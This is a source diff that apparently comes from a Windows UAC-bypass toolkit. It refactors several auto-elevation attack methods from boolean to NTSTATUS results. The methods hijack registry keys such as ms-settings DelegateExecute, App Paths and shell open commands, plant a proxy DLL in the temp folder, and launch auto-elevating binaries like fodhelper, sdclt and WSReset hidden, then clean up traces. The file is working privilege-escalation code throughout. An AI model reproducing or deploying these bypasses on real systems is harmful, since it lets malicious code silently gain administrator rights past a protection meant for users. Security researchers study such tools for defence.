@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.17
 *
-*  DATE:        17 Mar 2019
+*  DATE:        18 Mar 2019
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -42,14 +42,15 @@ UCM_ENIGMA0x3_CTX g_EnigmaThreadCtx;
 * Fixed in Windows 10 RS2
 *
 */
-BOOL ucmHijackShellCommandMethod(
+NTSTATUS ucmHijackShellCommandMethod(
     _In_opt_ LPWSTR lpszPayload,
     _In_ LPWSTR lpszTargetApp,
     _In_opt_ PVOID ProxyDll,
     _In_opt_ DWORD ProxyDllSize
 )
 {
-    BOOL    bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     HKEY    hKey = NULL;
     LRESULT lResult;
     LPWSTR  lpBuffer = NULL;
@@ -78,8 +79,7 @@ BOOL ucmHijackShellCommandMethod(
         else {
             //no payload specified, use default fubuki, drop dll first as wdscore.dll to %temp%
             if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
-                SetLastError(ERROR_INVALID_DATA);
-                return FALSE;
+                return STATUS_DATA_ERROR;
             }
             RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
             _strcpy(szBuffer, g_ctx->szTempDirectory);
@@ -126,7 +126,8 @@ BOOL ucmHijackShellCommandMethod(
         if (lResult != ERROR_SUCCESS)
             break;
 
-        bResult = supRunProcess(lpszTargetApp, NULL);
+        if (supRunProcess(lpszTargetApp, NULL))
+            MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
 
@@ -136,7 +137,7 @@ BOOL ucmHijackShellCommandMethod(
     if (hKey != NULL)
         RegCloseKey(hKey);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -276,12 +277,12 @@ DWORD ucmDiskCleanupWorkerThread(
 * Fixed in Windows 10 RS2
 *
 */
-BOOL ucmDiskCleanupRaceCondition(
+NTSTATUS ucmDiskCleanupRaceCondition(
     _In_ PVOID PayloadDll,
     _In_ DWORD PayloadDllSize
 )
 {
-    BOOL                bResult = FALSE;
+    NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;
     DWORD               ti;
     HANDLE              hThread = NULL;
     SHELLEXECUTEINFO    shinfo;
@@ -312,10 +313,10 @@ BOOL ucmDiskCleanupRaceCondition(
         // Well lets hope 10 min is enough.
         //
         if (WaitForSingleObject(hThread, 60000 * 10) == WAIT_OBJECT_0)
-            bResult = TRUE;
+            MethodResult = STATUS_SUCCESS;
         CloseHandle(hThread);
     }
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -337,24 +338,28 @@ BOOL ucmDiskCleanupRaceCondition(
 * Fixed in Windows 10 RS3
 *
 */
-BOOL ucmAppPathMethod(
+NTSTATUS ucmAppPathMethod(
     _In_ LPWSTR lpszPayload,
     _In_ LPWSTR lpszAppPathTarget,
     _In_ LPWSTR lpszTargetApp
 )
 {
-    BOOL    bResult = FALSE;
+    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
     LRESULT lResult;
     HKEY    hKey = NULL;
     LPWSTR  lpKeyPath = NULL;
     SIZE_T  sz;
 
-#ifndef _WIN64
-    PVOID   OldValue = NULL;
-#endif
+    if (lpszAppPathTarget == NULL)
+        return STATUS_INVALID_PARAMETER_2;
 
-    if ((lpszTargetApp == NULL) || (lpszAppPathTarget == NULL))
-        return FALSE;
+    if (lpszTargetApp == NULL)
+        return STATUS_INVALID_PARAMETER_3;   
 
     //
     // If under Wow64 disable redirection.
@@ -362,8 +367,9 @@ BOOL ucmAppPathMethod(
     //
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
@@ -399,7 +405,8 @@ BOOL ucmAppPathMethod(
             // Finally run target app.
             //
             if (lResult == ERROR_SUCCESS)
-                bResult = supRunProcess(lpszTargetApp, NULL);
+                if (supRunProcess(lpszTargetApp, NULL))
+                    MethodResult = STATUS_SUCCESS;
 
             RegCloseKey(hKey);
             RegDeleteKey(HKEY_CURRENT_USER, lpKeyPath);
@@ -415,11 +422,11 @@ BOOL ucmAppPathMethod(
     //
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -439,17 +446,21 @@ BOOL ucmAppPathMethod(
 * Fixed in Windows 10 RS4 (all cases)
 *
 */
-BOOL ucmSdcltIsolatedCommandMethod(
+NTSTATUS ucmSdcltIsolatedCommandMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL    bResult = FALSE, bExist = FALSE;
+    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL    bExist = FALSE;
     DWORD   cbData, cbOldData = 0;
     SIZE_T  sz = 0;
     LRESULT lResult;
-#ifndef _WIN64
-    PVOID   OldValue;
-#endif
+
     LPWSTR  lpTargetValue = NULL;
     HKEY    hKey = NULL;
 
@@ -458,8 +469,9 @@ BOOL ucmSdcltIsolatedCommandMethod(
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
@@ -508,7 +520,10 @@ BOOL ucmSdcltIsolatedCommandMethod(
         if (lResult == ERROR_SUCCESS) {
             _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, SDCLT_EXE);
-            bResult = supRunProcess(szBuffer, TEXT("/KICKOFFELEV"));
+
+            if (supRunProcess(szBuffer, TEXT("/KICKOFFELEV")))
+                MethodResult = STATUS_SUCCESS;
+
             if (bExist == FALSE) {
                 //
                 // We created this value, remove it.
@@ -531,11 +546,11 @@ BOOL ucmSdcltIsolatedCommandMethod(
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -549,18 +564,20 @@ BOOL ucmSdcltIsolatedCommandMethod(
 * Trigger: fodhelper.exe, computerdefaults.exe
 *
 */
-BOOL ucmMsSettingsDelegateExecuteMethod(
+NTSTATUS ucmMsSettingsDelegateExecuteMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL    bResult = FALSE;
+    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
     DWORD   cbData;
     SIZE_T  sz = 0;
     LRESULT lResult;
     LPWSTR lpTargetApp = NULL;
-#ifndef _WIN64
-    PVOID   OldValue;
-#endif
     HKEY    hKey = NULL;
 
     WCHAR szTempBuffer[MAX_PATH * 2];
@@ -570,8 +587,9 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
     //
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
@@ -633,7 +651,9 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 
             _strcat(szTempBuffer, lpTargetApp);
 
-            bResult = supRunProcess(szTempBuffer, NULL);
+            if (supRunProcess(szTempBuffer, NULL))
+                MethodResult = STATUS_SUCCESS;
+
             supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
         }
 
@@ -644,11 +664,11 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -665,7 +685,7 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 *            WSReset.exe without params for Hashim Jawad method
 *
 */
-BOOL ucmShellDelegateExecuteCommandMethod(
+NTSTATUS ucmShellDelegateExecuteCommandMethod(
     _In_ LPWSTR lpTargetApp,
     _In_ SIZE_T cchTargetApp, //in chars, future use
     _In_ LPWSTR lpTargetKey,
@@ -674,12 +694,16 @@ BOOL ucmShellDelegateExecuteCommandMethod(
     _In_ SIZE_T cchPayload //in chars, future use
 )
 {
-    BOOL    bResult = FALSE, bExist = FALSE, bDelegateExecuteExist = FALSE;
+    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL    bExist = FALSE, bDelegateExecuteExist = FALSE;
     DWORD   cbData, cbOldData = 0, cbOldDelegateData = 0, dwDisposition = 0;
     LRESULT lResult;
-#ifndef _WIN64
-    PVOID   OldValue;
-#endif
+
     LPWSTR  lpTargetValue = TEXT("");
     HKEY    hKey = NULL;
 
@@ -689,18 +713,19 @@ BOOL ucmShellDelegateExecuteCommandMethod(
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
     do {
-        if (cchPayload == 0)
-            return bResult;
         if ((cchTargetApp >= MAX_PATH) || (cchTargetApp == 0))
-            return bResult;
+            return STATUS_INVALID_PARAMETER_2;
         if ((cchTargetKey >= MAX_PATH) || (cchTargetKey == 0))
-            return bResult;
+            return STATUS_INVALID_PARAMETER_4;
+        if (cchPayload == 0)
+            return STATUS_INVALID_PARAMETER_6;
 
         _strcpy(szBuffer, lpTargetKey);
         _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
@@ -760,7 +785,8 @@ BOOL ucmShellDelegateExecuteCommandMethod(
 
             _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, lpTargetApp);
-            bResult = supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE);
+            if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE))
+                MethodResult = STATUS_SUCCESS;
 
             Sleep(5000);  //wait a bit until this shell shit complete it internals
                           //not required if you don't cleanup or use reg.exe
@@ -805,9 +831,9 @@ BOOL ucmShellDelegateExecuteCommandMethod(
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
-    return bResult;
+    return MethodResult;
 }
